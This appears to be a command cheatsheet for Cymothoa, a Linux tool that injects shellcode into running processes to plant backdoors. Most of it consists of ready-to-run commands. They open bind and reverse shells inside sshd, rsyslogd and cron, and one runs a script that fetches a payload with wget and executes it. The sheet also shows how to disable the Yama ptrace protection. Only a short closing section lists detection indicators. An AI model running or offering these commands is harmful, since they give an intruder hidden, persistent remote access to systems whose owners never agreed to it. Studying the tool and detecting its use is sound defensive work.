# Cymothoa — Cheatsheet

## Quick Reference

```bash
cymothoa -p <pid> -s <shellcode> [options]
```

## Core Usage

```bash
# List available shellcodes
cymothoa -S

# Bind shell on port 4444
cymothoa -p <pid> -s 0 -y 4444

# Reverse shell to attacker
cymothoa -p <pid> -s 3 -x 192.168.1.200 -y 4444

# Password-protected bind shell
cymothoa -p <pid> -s 2 -y 4444 -o "password"

# Thread-based injection (stealthier)
cymothoa -p <pid> -s 0 -y 4444 -F -b

# Fork-based injection
cymothoa -p <pid> -s 0 -y 4444 -f

# HTTP server on port 8800
cymothoa -p <pid> -s 6

# Scheduled backdoor (alarm)
cymothoa -p <pid> -s 13 -y 4444 -j 30

# Custom memory regions
cymothoa -p <pid> -s 0 -y 4444 -l "/lib/libc.so.6" -m "/lib/ld-linux.so.2"
```

## Shellcode Reference

| # | Type | Description | Flags |
|---|------|-------------|-------|
| 0 | Bind | `/bin/sh` bind shell | -y port |
| 1 | Bind | Bind + fork() | -y port |
| 2 | Bind | Bind + password auth | -y port, -o pass |
| 3 | Reverse | Connect back | -x IP, -y port |
| 4 | Proxy | TCP socket proxy | -x, -y, -r |
| 5 | Script | Script execution | -c script |
| 6 | HTTP | HTTP server on 8800 | None |
| 7 | Serial | Serial port binding | None |
| 8 | Fun | Fork bomb | None |
| 9 | Fun | Open CD-ROM loop | None |
| 10 | Audio | Audio via /dev/dsp | None |
| 11 | Scheduled | alarm() POC | -j seconds |
| 12 | Scheduled | setitimer() POC | -k microseconds |
| 13 | Scheduled | alarm() bind+fork | -j, -y |
| 14 | Scheduled | setitimer() UDP | -k, -x, -y |

## Main Options

| Flag | Description | Default |
|------|-------------|---------|
| `-p PID` | Target process | Required |
| `-s NUM` | Shellcode number | Required |
| `-l REGION` | Executable memory region | /lib/ld |
| `-m REGION` | Writable memory region | /lib/ld |

## Injection Options

| Flag | Description | Default |
|------|-------------|---------|
| `-f` | Fork parent | Off |
| `-F` | Don't fork parent | On |
| `-b` | Create thread | Off |
| `-B` | Don't create thread | On |
| `-w` | Pass memory address | Off |
| `-W` | Don't pass address | On |
| `-a` | Use alarm scheduler | Off |
| `-A` | Don't use alarm | On |
| `-t` | Use setitimer | Off |
| `-T` | Don't use setitimer | On |

## Payload Arguments

| Flag | Description |
|------|-------------|
| `-x IP` | IP for connect-back |
| `-y PORT` | Primary port |
| `-r PORT` | Secondary port |
| `-z USER` | 4-byte username |
| `-o PASS` | 8-byte password |
| `-c SCRIPT` | Inline script code |
| `-j SECS` | Timer (seconds) |
| `-k USECS` | Timer (microseconds) |

## Common Workflows

```bash
# Find target process
ps aux | grep sshd
pgrep -f "apache2|nginx|sshd"

# Inject into sshd
cymothoa -p $(pgrep sshd | head -1) -s 0 -y 4444

# Stealthy reverse shell
cymothoa -p $(pgrep -f rsyslogd) -s 3 -x 10.10.14.5 -y 443 -F -b

# Scheduled beacon
cymothoa -p $(pgrep cron) -s 13 -y 4444 -j 60

# Custom script delivery
cymothoa -p $(pgrep xinetd) -s 5 -c "#!/bin/sh\nwget http://192.168.1.200/payload.sh -O /tmp/p.sh\nchmod +x /tmp/p.sh\n/tmp/p.sh\nexit 0"
```

## Companion Utilities

```bash
# Binary grep (find patterns)
bgrep "\x90\x90\x90\x90" /usr/bin/target
bgrep "4889e5" /usr/bin/target

# UDP server for payloads #4, #14
udp_server 9999
```

## Requirements

- Linux/*nix with ptrace support
- Root or CAP_SYS_PTRACE capability
- `kernel.yama.ptrace_scope=0` if Yama is enabled

```bash
# Check ptrace scope
cat /proc/sys/kernel/yama/ptrace_scope

# Disable Yama (if needed)
sudo sysctl -w kernel.yama.ptrace_scope=0
```

## Limitations

- Linux only (requires ptrace)
- Root/CAP_SYS_PTRACE required
- Shellcode is architecture-specific (x86/x64)
- Runtime-only — lost on process termination
- May crash injected process
- Yama security module may block ptrace

## Detection Indicators

- Unexpected memory regions in /proc/<pid>/maps
- Increased process memory size
- Unusual network connections from legitimate processes
- ptrace syscalls in audit logs
- Modified instruction pointer
- Unexpected threads in process
